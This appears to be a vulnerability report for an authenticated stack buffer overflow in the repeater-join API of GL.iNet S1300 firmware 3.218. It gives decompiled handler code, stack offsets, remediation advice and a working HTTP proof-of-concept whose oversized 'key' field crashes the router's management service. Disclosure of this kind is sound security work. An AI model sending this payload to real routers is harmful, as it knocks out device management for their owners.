# GL.iNet S1300 3.218 was discovered to contain an authenticated stack buffer overflow in repeater_join

## Overview

- Vendor: GL.iNet
- Product: S1300 (QSDK, ARM32)
- Version: 3.218
- Component: /www/cgi-bin/api, /repeater/join
- Vulnerability Class: CWE-121 stack buffer overflow
- CVSS 3.1 (tentative): 6.5 Medium `AV:N/AC:L/PR:H/UI:N/S:U/C:N/I:N/A:H` (authenticated; at minimum a remote crash/DoS. If the stack canary is leaked or bypassed, the corrupted return path could give code execution and the score would rise to about 7.2.)
- Manufacturer: https://www.gl-inet.com/

## Affected version

- `qsdk-s1300-3.218-0726-1721958248.img`.
- SquashFS/xz at `0x3C137C`; `/www/cgi-bin/api`.
  (ELF 32-bit LSB ARM, musl, stripped).

## Vulnerability details

`POST /api/repeater/join` is handled by `sub_32ECC`. The handler reads
several JSON strings and copies them into fixed-size stack buffers with
unbounded `strcpy`:

```c
char v65[68];   // key (psk2/none branch)
char v66[68];   // identity (WPA enterprise branch)
char v67[68];   // password (WPA enterprise branch)
char v68[256];  // band
char s[20];     // mac
char v59[16];   // channel
char v64[40];   // caps
char dest[16];  // device
char v57[8];    // dongle
```

The relevant reads and copies:

```c
if (strstr(encrypt, "wpa")) {
    identity = gjson_get_string(req, "identity");
    strcpy(v66, identity);
    password = gjson_get_string(req, "password");
    strcpy(v67, password);
} else if (gjson_contain_key(req, "key")) {
    key = gjson_get_string(req, "key");
    strcpy(v65, key);
}
mac = gjson_get_string(req, "mac");
if (mac) strcpy(s, mac);
channel = gjson_get_string(req, "channel");
if (channel) strcpy(v59, channel);
caps = gjson_get_string(req, "caps");
if (caps) strcpy(v64, caps);
device = gjson_get_string(req, "device");
if (device) strcpy(dest, device);
dongle = gjson_get_string(req, "dongle");
if (dongle) strcpy((char *)v57, dongle);
```

There is no length check before any of these copies. A long `key`,
`password`, `identity`, `mac`, `channel`, `caps`, `device` or `dongle`
overwrites adjacent stack variables; with a sufficiently long value it
reaches the saved frame/canary and causes a crash at function return.
For example, `key` is at `[bp-0x1F8]` and the canary at `[bp-0x2C]`;
about 460 bytes are enough to reach the canary, and 500 bytes overwrite
it.

The route is a normal authenticated POST entry in the main API table; it
is not in the device's no-auth list (login/initpwd/hello/model/language/
first settings). Any valid session token can reach it.

## PoC

```http
POST /api/repeater/join HTTP/1.1
Host: <router>
Content-Type: application/json
Authorization: <valid session token>

{"ssid":"test","encrypt":"psk2","key":"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"}
```

The 500-byte `key` overwrites `v65`, `v66`, `v67`, `v68` and the stack
canary; the API process aborts on return and the web management service
is disrupted. A WPA-enterprise request can use the same length in
`identity`/`password`; `mac`/`channel` are shorter paths that corrupt
only adjacent locals.

## Evidence

Static IDA decompilation, route-table entry and hashes:

`experiments/vulnerability-triage/results/20261108-glinet-s1300-repeater-join-bof-01/evidence/`

- `static-sub_32ECC-repeater-join.txt` — full handler decompilation with
  buffer declarations and `strcpy` calls.
- `route-table.txt` — `/repeater/join` POST -> `sub_32ECC`.

No live router was used; this is a static finding. The overflow reaches
the canary before return; no canary leak or code-execution payload was
developed.

## Impact

An authenticated client can crash the API/web management process by
sending oversized repeater-join fields. Repeated requests cause a
persistent denial of service. Because the overwrite is a classic stack
buffer overflow, it is also a memory-corruption primitive; code
execution would require a canary leak or an information-disclosure
primitive, which was not demonstrated.

## Remediation / known-CVE relation

- Replace each `strcpy` with length-checked copies (`snprintf`/`strlcpy`)
  and enforce protocol limits: SSID <= 32, WPA key <= 63, MAC <= 17,
  channel numeric, caps/device/dongle allow-listed.
- Validate `encrypt` against the supported set before choosing the
  key/identity/password branch.
- NVD keyword searches for `GL.iNet repeater join`, `S1300 buffer
  overflow` and `GL-S1300` returned no matching CVE on 2026-11-08.
  CVE-2023-31475 is a different `guci2_get` buffer overflow in
  `libglutil.so`; CVE-2023-31478 is a Wi-Fi configuration information
  leak. Candidate 0-day; no CVE assigned and no vendor contact has been
  made.

## Additional Information

```markdown
### Vendor
GL.iNet

### Product
S1300 (QSDK, ARM32)

### Version or Commit
3.218

### Vulnerability Class
CWE-121 stack buffer overflow

### Description
POST /api/repeater/join copies key, identity, password, mac, channel, caps, device and dongle into fixed-size stack buffers with unbounded strcpy. Long values overflow the stack and abort the handler.

### Affected_component
/www/cgi-bin/api, /repeater/join

### Attack_vector
Authenticated JSON POST to /api/repeater/join with long key/identity/password/mac fields.

### Product_version
S1300 (QSDK, ARM32) 3.218

### Reference
- https://www.gl-inet.com/
- https://github.com/vuln-1/vuln/blob/main/GL.iNet/S1300_V3.218/report-2.md
```
